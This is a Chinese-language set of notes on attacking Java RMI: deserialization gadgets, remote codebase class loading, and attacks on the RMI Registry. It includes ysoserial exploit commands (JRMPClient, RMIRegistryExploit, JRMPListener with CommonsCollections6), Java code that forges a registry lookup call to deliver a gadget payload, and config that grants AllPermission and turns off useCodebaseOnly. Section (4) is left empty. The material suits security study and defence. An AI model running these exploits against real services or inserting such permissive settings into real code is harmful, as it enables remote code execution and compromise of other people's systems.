## RMI和JNDI攻击向量

### 客户端攻击服务端

**情况1：**
假设服务端存在一个公共的已知PublicKnown类（比如经典的Apache Common Collection，这里只是用PublicKnown做一个类比），它有readObject方法并且在readObject中存在命令执行的能力，所以我们客户端可以写一个与服务端包名，类名相同的类并继承Message类，通过远程函数调用传递恶意对象到服务端。

**情况2：**
通过Java RMI远程类加载攻击服务端。对于服务端而言，如果客户端传递的方法参数是远程对象接口方法参数类型的子类，那么服务端需要从客户端提供的java.rmi.server.codebaseURL去加载对应的类。

无论是客户端还是服务端要远程加载类，都需要满足以下条件：

* 由于Java SecurityManager的限制，默认是不允许远程加载的，如果需要进行远程加载类，需要安装RMISecurityManager并且配置java.security.policy，这在后面的利用中可以看到。
* 属性 java.rmi.server.useCodebaseOnly 的值必需为false。但是从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly 的默认值就是true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前虚拟机的java.rmi.server.codebase 指定路径加载类文件。使用这个属性来防止虚拟机从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。
```java
    //如果需要使用RMI的动态加载功能，需要开启RMISecurityManager，并配置policy以允许从远程加载类库
    System.setProperty("java.security.policy", RMIServer.class.getClassLoader().getResource("java.policy").getFile());
    RMISecurityManager securityManager = new RMISecurityManager();
    System.setSecurityManager(securityManager);
    //但是从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly 的默认值就是true。当该值为true时，将禁用自动加载远程类文件,
    System.setProperty("java.rmi.server.useCodebaseOnly","false");
```
```
java.policy
// Standard extensions get all permissions by default

grant {
	permission java.security.AllPermission;
};

```

### 服务端攻击客户端

**情况1：**
服务端如果想要攻击客户端，那么利用点就是存在客户端反序列化服务端的返回值的时候，即客户端存在公共的已知PublicKnown类（比如经典的Apache Common Collection，这里只是用PublicKnown做一个类比），它有readObject方法并且在readObject中存在命令执行的能力，服务端通过返回值返回序列化的PublicKnown类型的对象。

**情况2：**
通过Java RMI远程类加载攻击服务端。对于客户端而言，如果服务端返回的对象为远程接口方法返回对象的子类，那么客户端需要从服务端提供的java.rmi.server.codebaseURL去加载对应的类。
```java
 //设置java.rmi.server.codebase,客户端从codebase加载远程类
System.setProperty("java.rmi.server.codebase", "http://127.0.0.1:8000/");
Registry reg;
try {
        // 创建Registry
        reg = LocateRegistry.createRegistry(9999);
        System.out.println("java RMI registry created. port on 9999...");
    } catch (Exception e) {
        System.out.println("Using existing registry");
        reg = LocateRegistry.getRegistry();
    }
    //绑定远程对象到Registry
reg.bind("Services", services);
......
```
和客户端攻击服务端一样，需要客户端打开安全设置，允许远程加载类。
```java
    //如果需要使用RMI的动态加载功能，需要开启RMISecurityManager，并配置policy以允许从远程加载类库
    System.setProperty("java.security.policy", RMIServer.class.getClassLoader().getResource("java.policy").getFile());
    RMISecurityManager securityManager = new RMISecurityManager();
    System.setSecurityManager(securityManager);
    //但是从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly 的默认值就是true。当该值为true时，将禁用自动加载远程类文件,
    System.setProperty("java.rmi.server.useCodebaseOnly","false");
```

### 攻击注册中心
```java
(1) 利用DGC攻击RMI Registry，可以通过与DGC通信的方式发送恶意payload让注册中心反序列化
java -cp ysoserial-all.jar ysoserial.exploit.JRMPClient 127.0.0.1 9999 
CommonsCollections6 "calc"
```
```java
(2) 利用bind/rebind请求攻击RMI Registry (JDK版本必须在8u141之前)

java -cp ysoserial-all.jar ysoserial.exploit.RMIRegistryExploit 127.0.0.1 9999 CommonsCollections6 "calc" (PS: jdk<8u121)

服务端也是可以向注册中心序列化传输远程对象,那么直接把远程对象改成反序列化Gadget看下。从Client接收到的bind或rebind的remote obj，将由sun/rmi/registry/RegistryImpl_Skel.java#dispatch处理，获取到的序列化数据直接调用了readObject函数，导致了常规的Java反序列化漏洞的触发。这里我们只需要写一个bind或rebind的操作，即可攻击到RMI Registry。

其他：(PS:jdk<8u232_b09)
// 开启JRMPListener
java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections6 "calc"
// 发起攻击
java -cp target/ysoserial-all.jar ysoserial.exploit.RMIRegistryExploit2 127.0.0.1 1099 jrmphost 8888
或者java -cp target/ysoserial-all.jar ysoserial.exploit.RMIRegistryExploit3 127.0.0.1 1099 jrmphost 8888

Registry对于bind/rebind的请求，会去检查这个请求是否为本地请求，对于外部的请求，Registry会拒绝该请求,所以如果要使用bind/rebind请求来远程攻击Registry，JDK版本必须在8u141之前
```
```java
(3) 利用unbind/lookup请求攻击RMI Registry (绕过JDK版本必须在8u141之前的限制)
unbind和lookup实际上都会调用readObject来读取传递过来的参数，所以同样是可以利用的。

不过这里有一个问题，当我们调用unbind或者lookup时，只允许我们传递字符串，所以没法传递我们的恶意对象。

这个问题要解决有几种办法：

* 伪造连接请求
* rasp hook请求代码，修改发送数据
我用的是第一种，也是比较简单的一种，直接通过反射就能实现。

ObjectPayload payloadObj = payloadClass.newInstance();
Object payload = payloadObj.getObject(command);
String name = "pwned" + System.nanoTime();
Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap(name, payload), Remote.class);

// 获取ref
Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();
fields_0[0].setAccessible(true);
UnicastRef ref = (UnicastRef) fields_0[0].get(registry);

//获取operations
Field[] fields_1 = registry.getClass().getDeclaredFields();
fields_1[0].setAccessible(true);
Operation[] operations = (Operation[]) fields_1[0].get(registry);

// 模拟lookup的调用代码，传递可序列化的Object类型
RemoteCall var2 = ref.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L);
ObjectOutput var3 = var2.getOutputStream();
var3.writeObject(remote);
ref.invoke(var2);
```
```java
(4) 
```
(4)


https://blog.0kami.cn/2020/02/06/java/rmi-registry-security-problem/
https://blog.cfyqy.com/article/154071ea.html
https://paper.seebug.org/1091/#serverrmi-server
https://xz.aliyun.com/t/7079
https://xz.aliyun.com/t/7264
http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/
https://paper.seebug.org/1194/#_8
https://paper.seebug.org/1420/#_3